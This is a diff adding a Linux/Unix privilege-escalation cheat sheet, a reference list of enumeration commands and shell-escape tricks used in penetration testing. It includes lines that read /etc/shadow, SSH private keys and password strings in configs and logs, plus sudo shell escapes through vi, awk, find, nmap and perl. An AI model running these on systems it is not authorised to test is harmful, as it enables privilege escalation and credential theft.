@@ -1,0 +1,155 @@
+				-----------------------------------------------------------
+				Linux/Unix PrivEsc Cheatsheet -- By Aman Deep Aka Hackuean7
+				-----------------------------------------------------------
+------------------------------------------------
+kernel, operating system and device information
+------------------------------------------------
+    -->	COMMAND									-->	RESULT
+	uname -a									print all available system information
+	uname -r									kernel release
+	uname -n									system hostname
+	hostname									as above
+	uname -m									linux kernel architecture (32 or 64 bit)
+	cat /proc/version								kernel information
+	cat /etc/*-release								distribution information
+	cat /etc/issue									as above
+	cat /proc/cpuinfo								CPU information
+	df -a										file system information
+
+-----------------
+USERS AND GROUPS:
+-----------------
+	cat /etc/passwd									list all users on the system
+	cat /etc/group									list all groups on the system
+	for i in $(cat /etc/passwd 2>/dev/null | cut -d":" -f1 2>/dev/null);		list all uid's and respective group memberships
+	do id $i;done 2>/dev/null
+	cat /etc/shadow	      								show users hashes - PRIVILEGED COMMAND
+	grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 {print $1}'			list all super user accounts
+	finger										users currently logged in
+	pinky										as above
+	users										as above
+	who -a										as above
+	w										who is currently logged in and what they're doing
+	last										listing of last logged on users
+	lastlog										information on when all users last logged in
+	lastlog -u %username%								information on when the specified user last logged in
+	lastlog | grep -v "Never"							entire list of previously logged on users
+
+-------------------------------
+USER AND PRIVILEGE INFORMATION
+-------------------------------
+	whoami										current username
+	id										current user information
+	cat /etc/sudoers								who's allowed to do what as root - PRIVILEGED COMMAND
+	sudo -l										can the current user perform anything as root
+	sudo -l 2>/dev/null | grep -w 'nmap|perl|'awk'|'find'|'bash'|'sh'|'man'		can the current user run any 'interesting' binaries as root and if so also 		|'more'|'less'|'vi'|'vim'|'nc'|'netcat'|python|ruby|lua|irb' | xargs -r 	display the binary permissions etc.
+	ls -la 2>/dev/null
+
+--------------------------
+ENVIRONMENTAL INFORMATION
+--------------------------
+	env										display environmental variables
+	set										as above
+	echo $PATH									path information
+	history										displays command history of current user
+	pwd										print working directory, i.e. 'where am i'
+	cat /etc/profile								display default system variables
+	cat /etc/shells									display available shells
+
+------------------	
+INTERESTING FILES:
+------------------
+	find / -perm -4000 -type f 2>/dev/null						find SUID files
+	find / -uid 0 -perm -4000 -type f 2>/dev/null					find SUID files owned by root
+	find / -perm -2000 -type f 2>/dev/null						find GUID files
+	find / -perm -2 -type f 2>/dev/null						find world-writeable files
+	find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null			find world-writeable files excluding those in /proc
+	find / -perm -2 -type d 2>/dev/null						find word-writeable directories
+	find /home -name **.rhosts -print 2>/dev/null					find rhost cofig files
+	find /home -iname *.plan -exec ls -la {} ; -exec cat {} 2>/dev/null ;		find *.plan files,, list permissions and cat the file contents
+	find /etc/ -iname hosts.equiv -exec ls -la {} 2>/dev/null ; -exec cat {}	find hosts.equiv, list permissions and cat the file contents
+	2>/dev/null ;
+	ls -ahlR /root/									see if you can access other user directories to find interesting files
+	cat ~/.bash_history								show the current users' command history
+	ls -la ~/.*_history								show the current users' various history files
+	ls -la /root/.*_history								can we read root's history files
+	ls -la ~/.ssh/									check for interesting ssh files in the current users' directory
+	find / -name "id_dsa*" -o -name "id_rsa*" -o -name "known_hosts" -o -name	find SSH keys/host information
+	"authorized_hosts" -o -name "authorized_keys" 2>/dev/null | xargs -r ls -la
+	ls -la /usr/sbin/in.*								check configuration of inetd services
+	grep -l -i pass /var/log/*.log 2>/dev/null					check log files for keywords ('pass' in this example) and show positive matches
+	find /var/log -type f -exec ls -la {} ; 2>/dev/null				list files in specified directory (/var/log)
+	find /var/log -name *.log -type f -exec ls -la {} ; 2>/dev/null			list .log files in specified directory (/var/log)
+	find /etc/ -maxdepth 1 -name *.conf -type f -exec ls -la {} ; 2>/dev/null	list .conf files in /etc (recursive 1 level)
+	ls -la /etc/*.conf								as above
+	find / -maxdepth 4 -name *.conf -type f -exec grep -Hn password {} ;		find .conf files (recursive 4 levels) and output line number where the word
+	2>/dev/null									'password' is located
+	lsof -i -n									list open files (output will depend on accound privileges)
+	head /var/mail/root								can we read roots mail
+
+-------------------
+SERVICE INFORMATION
+-------------------
+	ps aux | grep root								view services running as root
+	ps aux | awk '{print$11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++'		lookup process binary path and permissions
+	cat /etc/inetd.conf								list services managed by inetd
+	cat /etc/xinetd.conf								as above for xinetd
+	cat /etc/xinetd.conf 2>/dev/null | awk '{print $7}' |xargs -r ls -la		a very 'ROUGH' command to extract associated binaries from xinetd.conf and show
+	2>/dev/null									permissions of each
+	ls -la /etc/exports 2>/dev/null; cat /etc/exports 2>/dev/null			permissions and contents of /etc/exports (NFS)
+
+----------
+JOBS/TASKS
+----------
+	crontab -l -u %username%							display scheduled jobs for the specified user -PRIVILEGED COMMAND
+	ls -ls /etc/cron*								scheduled jobs overview (hourly, daily, monthly etc)
+	ls -aRl /etc/cron* | awk '$1 ~ /w.$/' 2>/dev/null				what can 'others' write in /etc/cron* directories
+	top										list of current tasks
+
+------------------------------------
+NETWORKING, ROUTING & COMMUNICATIONS
+------------------------------------
+	/sbin/ifconfig -a								list all network interfaces
+	cat /etc/network/interfaces							as above
+	arp -a										display ARP communications
+	route										display route information
+	cat /etc/resolv.conf								show configured DNS server addresses
+	netstat -antp									list all TCP sockets and related PIDs (-p PRIVILEGED COMMAND)
+	netstat -anup									list all UDP sockets and related PIDs (-p PRIVILEGED COMMAND)
+	iptables -L									list rules - PRIVILEGED COMMAND
+	cat /etc/services								view port numbers/services mappings
+
+-------------------
+PROGRAMS INSTALLED:
+-------------------
+	dpkg -l										installed packages (debian)
+	rpm -qa										installed packages (red hat)
+	sudo -V										sudo version -does an exploit exist?
+	httpd -v									apache version
+	apache2 -v									as above
+	apache2ctl (or apachectl) -M							list loaded apache modules
+	mysql --version									installed MYSQL version details
+	psql -v										installed POSTGRES version details
+	perl -v										installed PERL version details
+	java -version									installed java version details
+	python --version								installed python version details
+	ruby -v										installed ruby versin details
+	find / -name %program_name% 2>/dev/null (i.e. nc, netcat, wget, nmap etc)	locate 'useful' programs (netcat, wget etc)
+	which %program_name%% (i.e. nc ,netcat, wget, nmap etc)				as above
+	dpkg --list 2>/dev/null| grep compiler | grep -v decompiler 2>/dev/null &&	list available compilers
+	yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null
+	cat /etc/apache2/envvars 2>/dev/null | grep -i 'user|group' |awk 		which account is Apache running as
+	'{sub(/.*export/,"")}1'
+
+-------------------------------
+COMMAND SHELL ESCAPE SEQUENCES:
+-------------------------------
+	:!bash										vi, vim
+	:set shell=/bin/bash :shell							vi, vim
+	!bash										man, more, less
+	find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ;			find
+	awk 'BEGIN {system("/bin/bash")}'						awk
+	--interactive									nmap
+	echo "os.execute('/bin/sh')" > exploit.nse					nmap (thanks to comment by anonymous below)
+	sudo nmap --script=exploit.nse
+	perl -e 'exec "/bin/bash";'							Perl
